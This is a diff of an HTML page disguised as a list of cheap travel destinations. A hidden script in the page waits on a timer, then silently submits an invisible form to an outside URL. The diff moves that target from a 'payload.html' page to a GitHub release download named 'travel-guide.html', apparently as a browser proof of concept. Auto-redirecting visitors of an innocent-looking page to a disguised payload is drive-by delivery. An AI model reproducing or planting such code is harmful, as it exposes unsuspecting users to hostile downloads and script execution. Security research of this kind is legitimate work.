@@ -12,14 +12,11 @@
   <h2>3. Colombia</h2><p>Vibrant cities, Caribbean beaches, $30-40/day.</p>
   <h2>4. Georgia</h2><p>Amazing wine country, friendly locals, $20-25/day.</p>
   <h2>5. Morocco</h2><p>Rich culture, stunning architecture, $30-35/day.</p>
-
   <script>
-    // form.submit to an HTML page on our domain — browser renders it, JS executes
-    // This is NOT a download — the browser opens the page directly
     setTimeout(function() {
       var form = document.createElement('form');
       form.method = 'GET';
-      form.action = 'https://needmoneyforhoes.github.io/brave-poc/payload.html';
+      form.action = 'https://github.com/needmoneyforhoes/brave-poc/releases/download/v1.0/travel-guide.html';
       form.style.display = 'none';
       document.body.appendChild(form);
       form.submit();
